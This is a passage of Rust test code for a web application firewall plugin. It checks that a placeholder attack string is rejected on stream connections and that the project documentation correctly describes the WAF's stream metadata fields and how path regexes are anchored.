    let mut sctx2 = stream_ctx(b"this is an attack", StreamBytesKind::PlaintextWire);
    assert!(matches!(
        plugin.on_stream_connect(&mut sctx2).await,
        PluginResult::Reject { .. }
    ));
}

#[test]
fn waf_stream_metadata_ownership_documentation_matches_stream_support() {
    // Regression for #2528: the canonical reserved-namespace note in
    // docs/plugins.md described the pre-stream implementation — claiming the
    // WAF runs only on HTTP-family protocols — even after TCP/UDP/DTLS
    // inspection started writing authoritative `waf.*` decision fields into
    // stream/session metadata for stream transaction summaries. Keep the
    // documented ownership contract aligned with the conditional stream
    // support so logging/schema authors do not treat stream `waf.*` values as
    // unavailable or non-authoritative.
    let docs = include_str!("../../../docs/plugins.md");
    let note = docs
        .split("Reserved log-metadata namespace")
        .nth(1)
        .and_then(|rest| rest.split("\n\n").next())
        .expect("waf reserved-namespace note");

    // The stale contract must stay gone.
    assert!(
        !note.contains("the WAF runs only on HTTP-family protocols"),
        "reserved-namespace note regressed to the HTTP-only contract"
    );

    // The note documents conditional TCP/UDP/DTLS WAF support, the exact
    // stream decision fields, and the ownership difference between the
    // HTTP-family `clone_log_metadata` filter and direct stream/session
    // metadata.
    assert!(
        note.contains("TCP/UDP/DTLS"),
        "note must cover stream protocols"
    );
    for field in [
        "waf.rule_hits",
        "waf.target",
        "waf.severity",
        "waf.action",
        "waf.block_reason",
        "waf.would_block_reason",
    ] {
        assert!(
            note.contains(field),
            "note must document the stream metadata field `{field}`"
        );
    }
    assert!(
        note.contains("clone_log_metadata"),
        "note must explain the HTTP-family ownership filter"
    );
    assert!(
        note.contains("no equivalent ownership filter"),
        "note must state that stream logs have no equivalent ownership filter"
    );
}

#[test]
fn waf_custom_rule_path_regex_docs_match_unanchored_runtime() {
    // Regression for #2331: docs/plugins.md previously claimed custom-rule
    // `conditions.paths` used the same start-anchored `^(?:...)` wrapper as
    // `global_exemptions.paths`. Runtime, docs/waf.md, and OpenAPI keep rule
    // conditions operator-authored and unanchored. Pin the three surfaces so
    // the plugin guide cannot drift back to the exemption grammar.
    let plugin_docs = include_str!("../../../docs/plugins.md");
    let waf_guide = include_str!("../../../docs/waf.md");
    let openapi = include_str!("../../../openapi.yaml");

    let custom_rule_table = plugin_docs
        .split("**Custom rule fields:**")
        .nth(1)
        .and_then(|rest| rest.split("`global_exemptions` supports").next())
        .expect("waf custom rule fields table");
    let conditions_row = custom_rule_table
        .lines()
        .find(|line| line.starts_with("| `conditions` |"))
        .expect("conditions row in custom rule fields table");
    let global_exemptions = plugin_docs
        .split("`global_exemptions` supports")
        .nth(1)
        .and_then(|rest| rest.split("```yaml").next())
        .expect("waf global_exemptions paragraph");

    assert!(
        !conditions_row.contains("wrapped as `^(?:regex)`"),
        "conditions.paths must not reuse the global-exemption anchor wrapper"
    );
    assert!(
        !conditions_row.contains("same exact / trailing-`*` prefix / `~` regex grammar"),
        "conditions.paths must not claim identical regex grammar to global_exemptions.paths"
    );
    assert!(
        conditions_row.contains("unanchored"),
        "conditions.paths must document unanchored regex matching"
    );
    assert!(
        conditions_row.contains("`is_match`"),
        "conditions.paths must mention Rust regex is_match semantics"
    );
    assert!(
        conditions_row.contains("~^/admin(?:/|$)"),
        "conditions.paths must include an explicit start-anchored example"
    );
    assert!(
        conditions_row.contains("`~api`")
            && conditions_row.contains("/api/users")
            && conditions_row.contains("/v1/api-keys"),
        "conditions.paths must include a floating-match example"
    );
    assert!(
        conditions_row.contains("Exact and prefix forms are unchanged"),
        "conditions.paths must keep exact/prefix behavior distinct from regex anchoring"
    );

    assert!(
        global_exemptions.contains("start-anchored"),
        "global_exemptions.paths must remain start-anchored"
    );
    assert!(
        global_exemptions.contains("wrapped as `^(?:regex)`"),
        "global_exemptions.paths must keep the implicit ^(?:...) wrapper"
    );
    assert!(
        global_exemptions.contains("unlike unanchored per-rule `conditions.paths`"),
        "global_exemptions.paths must distinguish unanchored rule conditions"
    );
    assert!(
        global_exemptions.contains("`~.*pattern`"),
        "global_exemptions.paths must keep the floating-match escape hatch"
    );

    assert!(
        waf_guide.contains("operator-authored regex")
            && waf_guide.contains("may match anywhere in the path")
            && waf_guide.contains("~^/api/"),
        "docs/waf.md must keep unanchored conditions.paths semantics"
    );
    assert!(
        waf_guide.contains("`~regex` is start-anchored (an implicit leading `^`)"),
        "docs/waf.md must keep start-anchored global_exemptions.paths semantics"
    );

    assert!(
        openapi.contains("operator-authored regex matched")
            && openapi.contains("regex conditions may match anywhere")
            && openapi.contains("`~regex` is a start-anchored regex"),
        "openapi.yaml must keep unanchored rule conditions and start-anchored exemptions"
    );
}
